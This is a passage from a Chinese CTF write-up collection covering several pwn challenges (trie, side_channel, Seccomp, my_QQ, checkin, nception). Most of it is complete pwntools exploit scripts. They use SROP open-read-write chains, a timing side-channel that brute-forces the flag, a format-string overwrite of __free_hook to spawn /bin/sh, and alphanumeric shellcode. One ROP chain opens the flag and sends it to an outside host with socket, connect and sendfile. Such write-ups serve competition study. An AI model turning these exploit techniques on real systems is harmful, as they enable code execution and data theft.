sl(str(length)) add(0x8,\"chuwei11\") add(0x8,\"chuwei22\") #mydbg() offset=0x0000000000501c68 payload=b'a'*8+p64(0x0000001300000000)+p64(0x00501ce000501ca8)+p64(0x0000001b00000000)+p64(offset)+p64(0x200) edit(0,0,0x345231,payload) show(1,0,0x50) p.interactive() 后记\r查看backtrace，发现 #11和#13 是wtoa 中的代码，在#13下断点 当执行到这里时，会发现程序进入了add函数的逻辑，且程序存在异步，所以我们在下一条汇编指令下断点 发现其确实执行了add函数的逻辑，因此猜测0x7ff7d8b9b464所在函数就是主要逻辑 算出偏移，在ida 里面查看在function 17函数中 那么经过调试也可以发现function 17为主要逻辑函数。 trie\r参考链接：https://blog.xmcve.com/2023/12/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2023-Writeup/#title-13 https://www.xp0int.top/posts/2023/12/18/2023-%E5%BC%BA%E7%BD%91%E6%9D%AF-Quals-Writeup-By-Xp0int/#26-trie 简单说一下本地的逻辑，实现了一个简单的路由表： add 功能输入两个ip，每次遇到新ip会插入分支，并且其节点值赋值为tot，然后根据trie中的值，将ip2存放在对应下标的end数组中 show 功能，查找ip 对应的下一跳ip值 get flag ，将flag 存储在secret 处 本题漏洞点在于对search 找到的end 下标没做限制，且会将flag 读入到secret处，当v3为0x40 时，就会泄露secret 处的值（每次泄露四字节），也就是flag。 注意到每次insert 时并没有对tot 初始化，那么就给了我们机会让v3的值大于0x40 首先新增两个ip “0.0.0.0” “255.255.255.255”，这样会使tot 的值达到0x40 当ip 的bit为0时，对应的trie 下标为偶数，当ip 的bit 为1时，对应的trie 下班为奇数。 insert 函数首先从下标0开始寻找，如果trie对应的下标处值为0，那么就赋值为 tot，如果有值，那么将该下标赋值给v4，根据v4*2+ip_bit作为下标得到trie[index] 的值，进行判断。 第一次add “0.0.0.0\"时，trie[0],trie[2],trie[4]…,trie[62] 被赋值为++tot， 第二次add “255.255.255.255\"时，会先判断trie[1]，由于其值为0，那么trie[1] 就会赋值为0x21，然后接着判断trie[67]，trie[69],……,trie[127] 此时tot 的值为0x40(也就是trie[127]的值为0x40），那么我们show(“255.255.255.255”)，就会找到trie[127]处的值0x40，打印end[0x40] 处的值，即flag 的前四字节。 那么我们如果让show找到trie[index] 处的值为0x41，0x42，0x43，……呢？我们只需add 一个ip，其ip值和（“0.0.0.0\"或 “255.255.255.255” 其中之一）有1，2，3，…… 位的偏差即可 如果add 128.0.0.0 那么就能打印end[0x41]处的值，add 192.0.0.0 那么就能打印end[0x42] 处的值 如果add 127.255.255.255 那么就能打印end[0x41]处的值，add 63.255.255.255，那么就能打印end[0x42] 处的值 from pwn import* context.arch='amd64' #context.log_level='debug' p=process('./trie') s = lambda data : p.send(data) sl = lambda data : p.sendline(data) sa = lambda text, data : p.sendafter(text, data) sla = lambda text, data : p.sendlineafter(text, data) r = lambda : p.recv() rn = lambda x : p.recvn(x) ru = lambda text : p.recvuntil(text) dbg = lambda text=None : gdb.attach(p, text) uu32 = lambda : u32(p.recvuntil(b\"\\xff\")[-4:].ljust(4, b'\\x00')) uu64 = lambda : u64(p.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\")) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) pr = lambda s : print('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) def mydbg(): gdb.attach(p) pause() def menu(choice): ru(\"4. Quit.\\n\") sl(str(choice)) def add(ip,hop): menu(1) ru(\"Input destination IP:\") sl(ip) ru(\"Input the next hop:\") sl(hop) def show(ip): menu(2) ru(\"Input destination IP:\") sl(ip) ru(\"The next hop is \") def decode_flag(flag): flag=flag.decode() ascii_representation = ''.join(chr(int(x)) for x in flag.split('.'))[::-1] print(ascii_representation) leak_list=[\"255.255.255.255\",\"128.0.0.0\",\"192.0.0.0\",\"224.0.0.0\",\"240.0.0.0\",\"248.0.0.0\"] #leak_list=[\"255.255.255.255\",\"127.255.255.255\",\"63.255.255.255\",\"31.255.255.255\",\"15.255.255.255\",\"7.255.255.255\"] for leak_ip in leak_list: p=process('./trie') add(\"0.0.0.0\",\"0.0.0.0\") add(\"255.255.255.255\",\"0.0.0.0\") #mydbg() add(leak_ip,\"0.0.0.0\") menu(3) show(leak_ip) flag=ru(\"\\n\")[:-1] decode_flag(flag) p.close() A-rstp\r待做 安洵杯 I-SOON x D0g3\rside_channel , initiate!\r首先让bss段读入ROP链，然后栈迁移执行ROP链，ROP链中使用SROP ORW一把嗦 from pwn import* context.arch='amd64' context.log_level='debug' p=remote(\"47.108.206.43\",26637) #p=process('./chall') s = lambda data : p.send(data) sl = lambda data : p.sendline(data) sa = lambda text, data : p.sendafter(text, data) sla = lambda text, data : p.sendlineafter(text, data) r = lambda : p.recv() rn = lambda x : p.recvn(x) ru = lambda text : p.recvuntil(text) dbg = lambda text=None : gdb.attach(p, text) uu32 = lambda : u32(p.recvuntil(b\"\\xff\")[-4:].ljust(4, b'\\x00')) uu64 = lambda : u64(p.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\")) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) pr = lambda s : print('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) def mydbg(): gdb.attach(p) pause() bss=0x0404060 leave_ret=0x000000000040136c mov_rax_15_ret=0x401193 syscall_ret=0x000000000040118a ru(\"easyhack\\n\") sigframe = SigreturnFrame() sigframe.rax = constants.SYS_open sigframe.rdi = bss+0x400 sigframe.rsi = 0 sigframe.rdx = 0 sigframe.rsp = bss+0xf8+0x10 sigframe.rip = syscall_ret sigframe1 = SigreturnFrame() sigframe1.rax = constants.SYS_read sigframe1.rdi = 3 sigframe1.rsi = bss+0x420 sigframe1.rdx = 0x50 sigframe1.rsp = bss+0xf8+0x10+0xf8+0x10+0x8 sigframe1.rip = syscall_ret sigframe2 = SigreturnFrame() sigframe2.rax = constants.SYS_write sigframe2.rdi = 1 sigframe2.rsi = bss+0x420 sigframe2.rdx = 0x50 sigframe2.rsp = bss+0xf8+0x10+0xf8+0x10 sigframe2.rip = syscall_ret #F8 payload=p64(mov_rax_15_ret)+p64(syscall_ret)+bytes(sigframe)+p64(0)+p64(mov_rax_15_ret)+p64(syscall_ret)+bytes(sigframe1) payload+=p64(0)+p64(mov_rax_15_ret)+p64(syscall_ret)+bytes(sigframe2) payload=payload.ljust(0x400,b\"\\x00\")+b\"flag\\x00\\x00\\x00\\x00\" sl(payload) ru(\"Do u know what is SUID?\") #mydbg() payload=b'a'*0x2a+p64(bss-0x8)+p64(leave_ret) sl(payload) p.interactive() Seccomp\r跟上题大概逻辑一样，开的沙箱不一样，禁用了write，运行mprotect，那么利用srop 使用mprotect开辟rwx段，然后写shellcode， open 打开flag ，read 读入flag ，然后 逐个字节爆破flag。 from pwn import* context.arch='amd64' context.log_level='debug' s = lambda data : p.send(data) sl = lambda data : p.sendline(data) sa = lambda text, data : p.sendafter(text, data) sla = lambda text, data : p.sendlineafter(text, data) r = lambda : p.recv() rn = lambda x : p.recvn(x) ru = lambda text : p.recvuntil(text) dbg = lambda text=None : gdb.attach(p, text) uu32 = lambda : u32(p.recvuntil(b\"\\xff\")[-4:].ljust(4, b'\\x00')) uu64 = lambda : u64(p.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\")) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) pr = lambda s : print('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) def mydbg(): gdb.attach(p) pause() bss=0x0404060 leave_ret=0x000000000040136c mov_rax_15_ret=0x401193 syscall_ret=0x000000000040118a def pwn(pos, char): ru(\"easyhack\\n\") sigframe = SigreturnFrame() sigframe.rax = constants.SYS_mprotect sigframe.rdi = 0x404000 sigframe.rsi = 0x500 sigframe.rdx = 7 sigframe.rsp = bss+0xf8+0x10 sigframe.rip = syscall_ret shellcode=shellcraft.open(\"flag\") shellcode+=shellcraft.read(3,bss+0x500,0x50) shellcode+= F''' cmp byte ptr[rsi+{pos}], {char} jz loop ret loop: jmp loop ''' #F8 payload=p64(mov_rax_15_ret)+p64(syscall_ret)+bytes(sigframe)+p64(0)+p64(bss+0xf8+0x10+0x10)+asm(shellcode) sl(payload) ru(\"Do u know what is SUID?\") #mydbg() payload=b'a'*0x2a+p64(bss-0x8)+p64(leave_ret) sl(payload) #pause() possible_list = \"-0123456789abcdefghijklmnopqrstuvwxyz{}\" flag = \"\" index = 0 last = 'a' while True: # 逐字符爆破 update = False # 对于每个字符，遍历所有打印字符 (ascii 码从 32 到 127) for ch in range(32,127): p=remote(\"47.108.206.43\",24921) #p = process(\"./chall\") # 远程比较容易断，可以多次连接 ''' for i in range(10): try: sh = remote(\"1.1.1.1\", \"11111\") break except: sleep(3) continue ''' pwn(index, ch) start = time.time() try: p.recv(timeout=2) except: pass end = time.time() p.close() # 测试接收时延，超过一定时限则说明在 pwn() 函数中插入 shellcode 后卡循环了，即 flag 中的第 index 个字符是 ch if(end-start \u003e 1.5): flag += chr(ch) last = chr(ch) update = True print(\"[ flag + 1 !!! ] \" + flag) break assert(update == True) if(last == '}'): break index += 1 print(\"flag: \" + flag) my_QQ\r参考链接：https://ycznkvrmzo.feishu.cn/docx/G17xduF91omE5nxgkgfc1W93nqb 前言：比赛时进入到了存在格式化字符串漏洞的函数，但是一直卡在rc4 加解密那里 首先介绍一下程序怎么启动 在本地目录下创下如下目录”./pem/server/” 然后使用openssl生成公私钥 openssl genrsa -out privatekey.pem 1024 openssl rsa -in privatekey.pem -out public.pem -outform PEM -pubout 接着程序开启一个10000端口，并向该端口接收和发送数据 进入start_routine 函数，主要有两个功能，register 和login，接收4字节，如果为yes， 则进入login 函数，如果不是，则进入register 函数。接下来先看register 功能 首先接收0x400字节的buf，buf 输入的内容后面进行介绍，接下来进行公钥验证，然后进入register 函数中 verify_key 函数中，会向1000端口的socket 链接发送public key，在1000端口的socket 链接中，我们接收到该pulbic key之后再发送给该程序即可 接下来进入register func 中，首先需要连接数据库，然后从a3（也就是上面说的0x400字节的buf ）前0x10 字节复制给user_name ，后面的0x30 字节复制给password。然后通过sql 语句查询用户是否存在，如果存在，打印该用户的的注册时间，如果不存在，则在表中创建该用户字段。 注意需要连接mysql 数据库，因此我们需要安装mysql，并创建my_qq 数据库， 这俩我选择下载phpstudy 集成环境，user 表的具体字段由ida 的反汇编代码得知 接下来分析login 功能 首先接收0x400 的buf ，和register 中一样， 前0x10 字节是usrname，后0x30 字节是password，查询表中是否存在 user name 和password 相同的用户，接着是交换公钥。 接着传输rc4 密钥，然后进入消息传递函数中，会对接收到的消息进行rc4 解密，然后打印 漏洞点即为格式化字符串漏洞 利用过程类似于栈上的格式化字符串漏洞，注意到dest，也就是rc4加密后的msg 的十六进制数据，其通过strlen进行计算长度的，如果我们通过在需要rc4加密后的数据上通过\"\\x00\"填充，那么后面的数据就会截断，不会对其解密。 因此，我们在格式化字符串漏洞利用时只用对前面的% size c% index hhn 这些数据加密，\"\\x00\"填充后跟上我们要篡改的地址即可。 起初我是对payload都进行了加密，发现在314偏移处存在解密后的数据，于是我对此进行任意地址写，但是发现这里程序会直接调用free，触发free_hook，这里我们仅仅只修改了一字节，会导致程序crash。 但是为何会调用free的原因未知（下面exp中的方法就不会调用free)，我们可以考虑换一种方法，因为程序最后会调用exit(-1)，那么将exit_hook 修改为one_gadget 也是可以get shell 的。 本题的利用思路就是利用格式化字符串漏洞任意写free_hook 为system，然后发送加密后的\"/bin/sh\\x00\"字符串即可getshell。 from pwn import* from Crypto.Cipher import ARC4 import base64 import struct context.log_level='debug' local=1 debug=1 if local: p_server=process('./serverpthread_rsa_hash') libc=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") p=remote(\"0.0.0.0\",10000) else: p_server=remote(\"47.108.206.43\",43481) libc=ELF(\"libc-2.31.so\") p=remote(\"47.108.206.43\",22820) s = lambda data : p.send(data) sl = lambda data : p.sendline(data) sa = lambda text, data : p.sendafter(text, data) sla = lambda text, data : p.sendlineafter(text, data) r = lambda : p.recv() rn = lambda x : p.recvn(x) ru = lambda text : p.recvuntil(text) dbg = lambda text=None : gdb.attach(p, text) uu32 = lambda : u32(p.recvuntil(b\"\\xff\")[-4:].ljust(4, b'\\x00')) uu64 = lambda : u64(p.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\")) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) pr = lambda s : print('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) #p=remote(\"47.108.206.43\",44947) def func(name,passwd): payload=name.ljust(0x10,b\"\\x00\")+passwd.ljust(0x40,b\"\\x00\") return payload def rc4_encrypt(data, key1): key = key1 print(key) print(len(key)) res = ARC4.new(key).encrypt(data).hex().encode() return res def int_to_bytes(num): # 将整数转换为字节 byte_data = num.to_bytes((num.bit_length() + 7) // 8, 'big') return byte_data #register # s(\"no\\x00\\x00\") # s(func(b\"root\",b\"root\")) # root_public_key=ru(\"-----END PUBLIC KEY-----\\n\") # print(root_public_key) # s(root_public_key) if local: #local public key root_public_key=\"\"\"-----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnJJhk+sxDQWZeBXmpECm HaWTpiZIh4EQfm9irhC5wQFOByWwiCrVrdi37h43rnp0PvnXEhKgGIokdoZLl1St NwApRX7RitZCo2V28PaQzwJwFQoy95RvvAHNn7gJSylEuKQfAbzC5oGH8IvWNokM +wkSdtMQ9EzfKZ5eEfVJxUGofecK/4UsQqgOZPtumatJf84psQXtbQQTsw94dxoz 55JJ8z+wsaqx4v3d21pggORPv1oR1LwIpWne1yPgOW3egGtpCO4FhoclYOIFehwh dD5aFsZ8fuRAQPMiOPOKUo5EZwz/L4eocGchQXQTK1PEBU392rnAvoee71EfSl7f 7QIDAQAB -----END PUBLIC KEY----- \"\"\" else: # remote_public_key root_public_key=\"\"\"-----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApoS1VyO6VZKyho32VC4/ btl1kgnMczBZvApAV2IC4h67fLbnnLlhOqiyIJcy6k6weK+JAdLCmquADnKJ3ZyW eChvFKJ/L39Cb5YEZoJs3kNST0cHqtYI1bZX7vCe1KBfMPuygXxkgNTcxG4Fdzwi SmKmYDcdDxeZP1z708x92fvPyYvFWiyaAzyw9QTqdH+JRcIRyVOdwc1ciSqqkaH4 TiOvVFHKsyInBIiF7bkl8mJMPb5vSKcVWrXHPEMcAiLmTG1mA1n/RKc+Ux3fUfjt 0UiATggCL86vCDcMhdToU+1QMdd3y+Nay9x/vm2thp/TpCl+MyzM1sld/TWJG+10 CwIDAQAB -----END PUBLIC KEY----- \"\"\" p.send(\"yes\\x00\") pause() p.send(func(b\"root\",b\"root\")) pause() p.send(root_public_key) ru(\"Login succeess \") rn(0x3f0) rc4_key=int(ru('00'),16) rc4_key=int_to_bytes(rc4_key) print(rc4_key) msg = rc4_encrypt(b'%1459$p',rc4_key) if debug: gdb.attach(p_server,\"b *$rebase(0x000482B)\") pause() sl(msg) p_server.recvuntil(\"The rc4_msg is\") p_server.recvuntil(\"The decode rc4_msg is \") p_server.recvline() libc_base=int(p_server.recvuntil(\"\\n\")[:-1],16)-libc.sym['write']-100 lg(\"libc_base\") free_hook=libc_base+libc.sym['__free_hook'] sys_addr=libc_base+libc.sym['system'] lg(\"free_hook\") lg(\"sys_addr\") for i in range(6): payload1=b'%' + str(((sys_addr)\u003e\u003e(8*i)) \u0026 0xff).encode() + b'c%15$hhn' payload1=rc4_encrypt(payload1,rc4_key) payload=payload1.ljust(0x48,b\"\\x00\")+p64(free_hook+i) sl(payload) pause() payload=rc4_encrypt(b\"/bin/sh\\x00\",rc4_key) sl(payload) p.close() p_server.interactive() NCTF\rcheckin\r本题开启的沙箱使用seccomp-tools 显示有点问题，应该是运行write 调用，但是要求fd为1，count 为1，read 要求fd为0，count为1。 程序要求我们输入可见字符，我们先利用push pop 将rax设置成当前rip 的值，然后调用ae64 将我们的输入的shellcode转化为可见字符shellcode。 所以正常写shellcode就行，比赛中我们的方法是：read 的count 可以使用0x100000001绕过，然后循环write flag即可 from pwn import* from ae64 import AE64 context.arch='amd64' context.log_level='debug' p=remote(\"8.130.35.16\",58002) #p=process(['checkin']) s = lambda data : p.send(data) sl = lambda data : p.sendline(data) sa = lambda text, data : p.sendafter(text, data) sla = lambda text, data : p.sendlineafter(text, data) r = lambda : p.recv() rn = lambda x : p.recvn(x) ru = lambda text : p.recvuntil(text) dbg = lambda text=None : gdb.attach(p, text) uu32 = lambda : u32(p.recvuntil(b\"\\xff\")[-4:].ljust(4, b'\\x00')) uu64 = lambda : u64(p.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\")) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) pr = lambda s : print('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) def mydbg(): gdb.attach(p,\"b *$rebase(0x01764)\") pause() #0x20230000 shellcode=\"\" shellcode+=\"\"\" push 0x50505050 pop rax xor rax,0x7073506c \"\"\" #sc=shellcraft.read(0,0x20230120,0x100000001) flag_addr=0x20230000+0xf0+0x30 sc=f\"\"\" push 0 pop rdi push 3 pop rax syscall \"\"\" sc+=shellcraft.open(\"flag\") sc+=f\"\"\" push rax pop rdi push {flag_addr+0x100} pop rsi mov rdx,0x100000001 push 0 pop rax syscall \"\"\" sc+=f\"\"\" mov r8,0 loop: push 1 pop rdi push {flag_addr+0x100} pop rsi add rsi,r8 push 0x1 pop rdx push 0x1 pop rax syscall add r8,1 jmp loop syscall \"\"\" ru(\"Give me your shellcode:\") #mydbg() enc_shellcode = asm(shellcode)+AE64().encode(asm(sc),'rax',0,\"small\") print(hex(len(enc_shellcode))) s(enc_shellcode.ljust(0xf0,b\"A\")+b\"flag\") p.interactive() 看了出题人 的博客，才知道原来read 是可以循环读的 from pwn import* from ae64 import AE64 context.arch='amd64' context.log_level='debug' p=remote(\"8.130.35.16\",58002) #p=process(['checkin']) s = lambda data : p.send(data) sl = lambda data : p.sendline(data) sa = lambda text, data : p.sendafter(text, data) sla = lambda text, data : p.sendlineafter(text, data) r = lambda : p.recv() rn = lambda x : p.recvn(x) ru = lambda text : p.recvuntil(text) dbg = lambda text=None : gdb.attach(p, text) uu32 = lambda : u32(p.recvuntil(b\"\\xff\")[-4:].ljust(4, b'\\x00')) uu64 = lambda : u64(p.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\")) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) pr = lambda s : print('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) def mydbg(): gdb.attach(p,\"b *$rebase(0x01764)\") pause() #0x20230000 shellcode=\"\" shellcode+=\"\"\" push 0x50505050 pop rax xor rax,0x7073506c \"\"\" #sc=shellcraft.read(0,0x20230120,0x100000001) flag_addr=0x20230000+0xf0+0x30 sc=f\"\"\" push 0 pop rdi push 3 pop rax syscall \"\"\" sc+=shellcraft.open(\"flag\") sc+=f\"\"\" push rax pop rdi inc rdx xor rbx,rbx read_loop: lea rsi,[rsp+rbx] inc rbx xor rax,rax syscall cmp rax,0 jne read_loop push 1 pop rdi push 1 pop rdx xor r8,r8 write_loop: lea rsi,[rsp+r8] inc r8 push 1 pop rax syscall cmp r8,rbx jne write_loop push 0 \"\"\" ru(\"Give me your shellcode:\") #mydbg() enc_shellcode = asm(shellcode)+AE64().encode(asm(sc),'rax',0,\"small\") print(hex(len(enc_shellcode))) s(enc_shellcode) p.interactive() nception\r这题考察的主要是c++ 的异常处理。 程序本身里有两个catch块，一个位于main中，一个位于cleanup函数中。 在edit中，会判断 输入的buf，通过strlen(buf)计算长度，并判断其是否超过size，如果超过，就进入异常处理。 在unwind过程中，存在恢复栈帧的过程，也就是leave_ret。 思路一\rmain函数catch在while内部，会接着main逻辑执行，而cleanup函数中close掉012就leave_ret;return了。 那么我们就可以利用cleanup进行栈迁移，进行rop。 由于程序关闭了0，1，2 那么我们就要利用 open(\"flag\"),sockfd = socket(2, 1, 0),connect(sockfd, socked_addr, 16),sendfile(sockfd,flag_fd,offset,count)，然后本机监听端口获得flag。 socket结构体的获取可参考该文章：https://blog.wingszeng.top/pwn-use-socket-to-bypass-close-out/ 此外还需介绍一些特殊的gadget 用于设置调用函数的参数。 0x000000000040284c : pop rbx ; pop r12 ; pop rbp ; ret 0x4022dc \u003c__do_global_dtors_aux+28\u003e: add DWORD PTR [rbp-0x3d],ebx 0x4022df \u003c__do_global_dtors_aux+31\u003e: nop 0x4022e0 \u003c__do_global_dtors_aux+32\u003e: ret 在bss段残留的stderr stdout stdin 的libc地址，我们需要算出libc中函数地址具体这三者之一的偏移，通过上述两个gadget ，将其设置为我们想要的libc地址，接下来便是如何调用这个地址 0x00000000004022dd : pop rbp ; ret 0x00000000004030e2 : mov rax, qword ptr [rbp - 8] ; mov rax, qword ptr [rax + 0x10] ; pop rbp ; ret 0x000000000040226c : jmp rax 通过上述gadget 我们可以控制rbp，进而控制rax，通过jmp rax 实现任意地址跳转执行。 但是程序中并没有pop rdi，rsi，rdx，这样的gadget 。 因此我们需要利用libc中的这样的gadget，来控制函数的参数，最后再调用所需要的函数。由于一个chunk的大小为0x200，所以我们需要在多个chunk 中布置rop链，通过pop rsp进行栈迁移。 事实上我们可以调用mprotect 函数开辟rwx段写shellcode，这样所需的字节就会少很多 另外，由于程序是使用strlen 计算 要复制buf的长度，那么如果出现ROP链中出现\"\\x00\"，就会被截断，std::cin在读取字符时会跳过空白字符（空格、制表符、换行符等），所以我们需要额外判断一下，是分八字节写还是逐个字节写 from pwn import* context.arch='amd64' #context.log_level='debug' p=remote(\"8.130.35.16\",58000) #p=process(\"./pwn\") libc=ELF(\"./libc.so.6\") s = lambda data : p.send(data) sl = lambda data : p.sendline(data) sa = lambda text, data : p.sendafter(text, data) sla = lambda text, data : p.sendlineafter(text, data) r = lambda : p.recv() rn = lambda x : p.recvn(x) ru = lambda text : p.recvuntil(text) dbg = lambda text=None : gdb.attach(p, text) uu32 = lambda : u32(p.recvuntil(b\"\\xff\")[-4:].ljust(4, b'\\x00')) uu64 = lambda : u64(p.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\")) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) pr = lambda s : print('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) def mydbg(): gdb.attach(p,\"b *0x402441\") pause() def menu(choice): ru(\"Now input your choice: \") sl(str(choice)) def add(): menu(1) def edit(index,offset,content): menu(2) ru(\"To write object, input idx:\") sl(str(index)) ru(\"Now data offset:\") sl(str(offset)) ru(\"Now input your data:\") s(content) def show(idx): menu(3) ru(\"Which one do you want to read?\") sl(str(idx)) def delete(idx): menu(4) ru(\"Which one do you want to destroy?\") sl(str(idx)) # 0x4022dc \u003c__do_global_dtors_aux+28\u003e: add DWORD PTR [rbp-0x3d],ebx # 0x4022df \u003c__do_global_dtors_aux+31\u003e: nop # 0x4022e0 \u003c__do_global_dtors_aux+32\u003e: ret # 0x0000000000402f31 : call ptr [rbp - 0x3d] magic_gadget=0x4022dc stdout_addr=0x406040 stderr_addr=0x4061A0 call_rbp=0x0000000000402f31 pop_rbx_r12_rbp_ret=0x000000000040284c #: pop rbx ; pop r12 ; pop rbp ; ret #0x0000000000403121 : mov rax, qword ptr [rbp - 0x18] ; leave ; ret def edit_func(index,payload): for i in range(0, len(payload), 8): edit(index, i, payload[i:i+8]+b\"\\n\") def edit_func1(index,offset,payload): for i in range(0, len(payload)): edit(index, i+offset, payload[i:i+1]+b\"\\n\") def modify(addr, offset,flag=False): if flag: print(\"offset=\",offset) print(p32(offset, sign='signed')) pause() return flat([ p64(pop_rbx_r12_rbp_ret), p32(offset, sign='signed') + p32(0), p64(0), p64(addr + 0x3d), p64(magic_gadget), ]) add() delete(0) add() show(0) ru(\"Data: \") heap_addr=u32(rn(2).ljust(0x4,b\"\\x00\"))\u003c\u003c12 lg(\"heap_addr\") add() #1 add() #2 add() #3 add() #4 add() #5 chunk1_addr=heap_addr+0x1100 chunk2_addr=heap_addr+0x1330 chunk3_addr=heap_addr+0x1560 chunk4_addr=heap_addr+0x1790 chunk5_addr=heap_addr+0x19c0 sock_addr=chunk1_addr+0x1d0 bss=0x4061D0 pop_rsp=0x000000000040284e #0x0000000000402577 : pop rsp ; pop r13 ; pop rbp ; ret pop_rdi=0x0000000000027765 pop_rsi=0x0000000000028f19 pop_rdx=0x00000000000fdcfd pop_rdx_rcx_rbx=0x00000000000edc7f #: pop rdx ; pop rcx ; pop rbx ; ret pop_rbp=0x004030ea#: pop rbp; ret; mov_rax=0x00000000004030e2# :# mov rax, qword ptr [rbp - 8] ; mov rax, qword ptr [rax + 0x10] ; pop rbp ; ret jmp_rax=0x00402dbe# jmp rax; flag_addr=heap_addr+0x1100+0x30 payload=b'a'*0x3+p64(stdout_addr)+b'a'*(0x2d-0x28)+p64(0x4061A0-0x10)*3+p64(stdout_addr-0x10)+b\"flag\\x00\\x00\\x00\\x00\"+p64(stdout_addr+0x3d) payload+=flat([ modify(stderr_addr, pop_rdi- libc.sym['_IO_2_1_stderr_']), p64(pop_rbp), p64(flag_addr-0x18), p64(mov_rax), p64(0), p64(jmp_rax), p64(flag_addr), modify(stderr_addr, pop_rsi- pop_rdi), p64(pop_rbp), p64(flag_addr-0x18), p64(mov_rax), p64(0), p64(jmp_rax), p64(0), modify(stderr_addr, pop_rdx-0x111111-pop_rsi), modify(stderr_addr, 0x111111), p64(pop_rbp), p64(flag_addr-0x18), p64(mov_rax), p64(0), p64(jmp_rax), p64(0), modify(stdout_addr, libc.sym['open']- libc.sym['_IO_2_1_stdout_']), p64(pop_rbp), p64(flag_addr), p64(mov_rax), p64(0), p64(jmp_rax), p64(pop_rsp), p64(chunk2_addr-0x8+0x30) ]) payload=payload.ljust(0x1d0,b\"\\x00\") edit_func(1,payload) edit_func1(1,0x1d0,p64(0xa2217c70b8220002).ljust(16, b'\\x00')) #socket struct payload1=b'a'*0x30+flat([ modify(stderr_addr, pop_rdi-pop_rdx), p64(pop_rbp), p64(flag_addr-0x18), p64(mov_rax), p64(0), p64(jmp_rax), p64(2), modify(stderr_addr, pop_rsi- pop_rdi), p64(pop_rbp), p64(flag_addr-0x18), p64(mov_rax), p64(0), p64(jmp_rax), p64(1), modify(stderr_addr, pop_rdx-0x111111-pop_rsi), modify(stderr_addr,0x111111), p64(pop_rbp), p64(flag_addr-0x18), p64(mov_rax), p64(0), p64(jmp_rax), p64(0), modify(stdout_addr,libc.sym['socket'] - libc.sym['open']), p64(pop_rbp), p64(flag_addr), p64(mov_rax), p64(0), p64(jmp_rax), p64(pop_rsp), p64(chunk3_addr-0x8+0x30) ]) edit_func(2,payload1) payload2=b'a'*0x30+flat([ modify(stderr_addr, pop_rdi-pop_rdx), p64(pop_rbp), p64(flag_addr-0x18), p64(mov_rax), p64(0), p64(jmp_rax), p64(1), modify(stderr_addr, pop_rsi- pop_rdi), p64(pop_rbp), p64(flag_addr-0x18), p64(mov_rax), p64(0), p64(jmp_rax), p64(sock_addr), modify(stderr_addr, pop_rdx-0x111111-pop_rsi), modify(stderr_addr,0x111111), p64(pop_rbp), p64(flag_addr-0x18), p64(mov_rax), p64(0), p64(jmp_rax), p64(16), modify(stdout_addr,libc.sym['connect'] - libc.sym['socket']), p64(pop_rbp), p64(flag_addr), p64(mov_rax), p64(0), p64(jmp_rax), p64(pop_rsp), p64(chunk4_addr-0x8+0x30) ]) edit_func(3,payload2) payload3=b'a'*0x30+flat([ modify(stderr_addr, pop_rdi-pop_rdx), p64(pop_rbp), p64(flag_addr-0x18), p64(mov_rax), p64(0), p64(jmp_rax), p64(1), modify(stderr_addr, pop_rsi- pop_rdi), p64(pop_rbp), p64(flag_addr-0x18), p64(mov_rax), p64(0), p64(jmp_rax), p64(0), modify(stderr_addr, pop_rdx_rcx_rbx-0x111111-pop_rsi), modify(stderr_addr,0x111111), p64(pop_rbp), p64(flag_addr-0x18), p64(mov_rax), p64(0), p64(jmp_rax), p64(0), p64(0x50), p64(0), modify(stdout_addr,libc.sym['sendfile'] -0x111111-libc.sym['connect']), modify(stdout_addr,0x111111), p64(pop_rbp), p64(flag_addr), p64(mov_rax), p64(0), p64(jmp_rax), ]) edit_func(4,payload3) print(hex(len(payload))) lg(\"heap_addr\") #mydbg() pause() edit(0,0x1f0,b\"a\"*0x220+p64(heap_addr+0x1100+0x38)+p64(0x0402395)+b\"\\n\") p.interactive() 思路二\r另一种解法，可见星盟安全团队的wp：https://blog.xmcve.com/2023/12/28/NCTF2023-Writeup/#title-13 在main函数的catch 中会先执行___cxa_begin_catch，该函数会指向对象的指针 该对象的前8字节指向libc c++ 中的vtable ，后8字节指向存储字符串的堆地址。 接下来会将rax赋值给rbp-0x18 的地址。 我们可以在edit 控制rbp，然后通过错误处理执行到这里，那么 利用该条语句可以实现任意地址写。 注意到程序中的结构如下ptr-\u003eheap-\u003econtent 我们可以通过任意地址写将rax 写到 heap 中指向content的指针，那么通过show 就可以泄露libc地址。 此时泄露完libc之后，可以像上面的解法一样，进行栈迁移后即可控制执行流程，且有了libc地址，可以直接利用pop rdi 这样的gadget了 另一方面，我们可以利用这个任意地址写将程序中的数据结构指针末位置0，实现错位构造，从而实现任意读写。 可以看到如果我们将ptr中存储的heap 